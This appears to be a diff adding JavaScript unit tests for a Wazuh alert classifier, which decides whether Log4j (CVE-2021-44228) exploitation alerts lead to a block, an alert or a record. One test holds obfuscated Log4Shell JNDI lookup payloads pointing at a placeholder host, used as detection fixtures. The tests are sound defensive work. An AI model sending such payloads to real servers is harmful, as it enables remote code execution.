@@ -85,3 +85,82 @@ test('only high confidence CVE exploitation creates expiring evidence-linked den
  assert.deepEqual(await guard({requestId:'synthetic'},
   {sourceIp:first.data.srcip,now:Date.parse(first.timestamp)+16*60000}),baseline);
 });
+
+test('Wazuh repeated T1190 exploitation is block even when URL is only a marker',()=>{
+ const a=structuredClone(fixture.alerts[6]);
+ a.rule={level:12,mitre:['T1190'],description:'Log4j 원격 조회 악용 요청이 여러 번 관측되었습니다'};
+ a.data={srcip:'203.0.113.88',url:'/notes?q=doc-log4j-repeat',count:'12'};
+ const out=decide(a);
+ assert.deepEqual(out,{action:'block',confidence:0.96,reason:'log4shell-repeated-exploit'});
+ const b=structuredClone(a);b.rule.description='CVE-2021-44228 취약점 악용 요청 8건';
+ assert.equal(decide(b).action,'block');
+ const c=structuredClone(a);c.rule.description='JNDI remote lookup 공격 반복';
+ assert.equal(decide(c).action,'block');
+});
+
+test('Wazuh repeated pattern needs all of MITRE tag severity count and exploit family evidence',()=>{
+ const base=structuredClone(fixture.alerts[0]);
+ base.rule={level:11,mitre:{id:['T1190']},description:'Log4j remote lookup exploitation'};
+ base.data={srcip:'203.0.113.88',url:'/notes?marker=doc',count:'9'};
+ assert.equal(decide(base).action,'block');
+ const variants=[
+  a=>{a.rule.level=9;},
+  a=>{a.data.count='4';},
+  a=>{a.data.count=undefined;},
+  a=>{a.data.count='not-a-number';},
+  a=>{a.rule.mitre=[];},
+  a=>{a.rule.description='기존 일반 서비스에서 반복된 요청';},
+ ];
+ for(const mutate of variants){
+  const a=structuredClone(base);mutate(a);
+  assert.notEqual(decide(a).action,'block');
+ }
+});
+test('a high-severity vulnerability scanner with repeated count remains alert-only',()=>{
+ const a=structuredClone(fixture.alerts[0]);
+ a.rule={level:12,mitre:['T1190'],description:'Log4j CVE-2021-44228 취약점 스캔 도구 점검'};
+ a.data={srcip:'192.0.2.29',url:'/help?q=log4shell-check',count:'20'};
+ assert.equal(decide(a).action,'alert');
+ assert.ok(decide(a).confidence>=0.5&&decide(a).confidence<0.85);
+ const b=structuredClone(a);b.rule.description='Log4j vulnerability scanner probe';
+ assert.equal(decide(b).action,'alert');
+});
+test('high-level ambiguous one-off Log4j request stays alert and never blocks',()=>{
+ const a=structuredClone(fixture.alerts[6]);
+ a.rule={level:11,mitre:{id:'T1190'},description:'JNDI Log4j 원격 조회 탐색'};
+ a.data={srcip:'192.0.2.31',url:'/notes?q=doc',count:'1'};
+ assert.equal(decide(a).action,'alert');
+});
+test('ordinary low-severity CVE or Log4j documentation remains record',()=>{
+ for(const title of [
+  'Log4j CVE-2021-44228 패치 문서를 확인했습니다',
+  'JNDI 사용 설명서를 열었습니다',
+  'Log4Shell vulnerability scanning guide educational page',
+ ]){
+  const a=structuredClone(fixture.alerts[12]);
+  a.rule={level:2,mitre:[],description:title};
+  a.data={url:'/docs?q=log4j',srcip:'192.0.2.45'};
+  assert.equal(decide(a).action,'record',title);
+ }
+});
+test('request payload obfuscation remains a direct block without structural metadata',()=>{
+ const a=structuredClone(fixture.alerts[13]);
+ a.rule={level:2,mitre:[],description:'메모 페이지 로드'};
+ a.data={url:'/search?q='+encodeURIComponent(encodeURIComponent('${jndi:ldap://lookup.invalid/a}'))};
+ assert.equal(decide(a).action,'block');
+ a.data={query:'${${env:NAME:-j}ndi:rmi://lookup.invalid/b}'};
+ assert.equal(decide(a).action,'block');
+ a.data={http:{headers:{'X-Request-ID':'${${lower:j}ndi:dns://lookup.invalid/check}'}}};
+ assert.equal(decide(a).action,'block');
+});
+test('invalid unexpected input returns a safe record result without exceptions',()=>{
+ for(const candidate of [null,0,undefined,{},[],{rule:{level:1000,mitre:['T1190']},data:{count:'999'}},
+  {rule:{level:12,mitre:['T1190'],description:'Log4j exploit'},data:{count:'-1'}},
+ ]){
+  const answer=decide(candidate);
+  assert.ok(['block','alert','record'].includes(answer.action));
+  assert.equal(typeof answer.reason,'string');
+  assert.ok(answer.confidence>=0&&answer.confidence<=1);
+  assert.notEqual(answer.action,'block');
+ }
+});
